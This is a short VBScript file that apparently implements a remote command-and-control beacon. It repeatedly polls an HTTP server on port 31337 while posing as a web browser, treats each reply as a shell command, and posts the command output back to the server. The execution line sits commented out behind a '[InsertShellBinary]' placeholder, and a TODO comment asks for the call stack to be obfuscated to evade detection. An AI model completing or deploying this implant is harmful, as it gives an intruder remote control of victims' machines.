' TODO: obfuscate the cmd callstack

Dim sourceURL, updateInterval, httpClient, shellExecutor, commandResponse, base64Command

sourceURL = "http://127.0.0.1:31337"
updateInterval = 5000

Set httpClient = WScript.CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set shellExecutor = WScript.CreateObject("WScript.Shell")

Do While True
    On Error Resume Next
    
    httpClient.open "GET", sourceURL, False
    httpClient.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    httpClient.send ""
    
    If httpClient.Status = 200 Then
        base64Command = httpClient.responseText
        
        If InStr(base64Command, "exit") > 0 Then Exit Do
        
'       Set commandResponse = shellExecutor.Exec("[InsertShellBinary] /c " & base64Command)
        
        httpClient.open "POST", sourceURL, False
        httpClient.setRequestHeader "Content-Type", "text/plain"
        httpClient.send commandResponse.StdOut.ReadAll
    End If
    
    On Error GoTo 0
    WScript.Sleep updateInterval
Loop
